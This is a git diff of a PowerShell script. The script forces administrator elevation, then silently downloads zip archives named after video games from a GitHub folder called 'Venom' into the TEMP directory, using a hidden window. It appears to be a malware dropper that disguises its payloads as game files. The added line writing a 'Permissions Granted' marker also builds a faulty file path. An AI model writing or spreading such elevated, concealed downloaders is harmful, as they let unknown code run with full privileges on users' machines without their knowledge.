@@ -1,10 +1,9 @@
-
+$textPath = "$env:TEMP\perm.txt"
 $zipFilePath = "$env:TEMP"
 $zipUrl = "https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/AssassinsCreed_SE.zip"
 $zipUrl_1 = "https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/Fifa-Ps5.zip"
 $zipUrl_2 = "https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/gta5-Ps5.zip"
 $desktopPath = [System.Environment]::GetFolderPath("Desktop")
-
 function Test-IsAdmin {
     $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
     return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
@@ -15,6 +14,8 @@ if (-not (Test-IsAdmin)) {
     Start-Process powershell -ArgumentList $arguments -Verb RunAs
     Exit
 }
+
+Set-Content -Path "$textPath\perm.txt" -Value "Permissions Granted"
 
 powershell -windowstyle hidden Invoke-WebRequest -Uri $zipUrl -OutFile "$zipFilePath\AssassinsCreed_SE.zip"
 
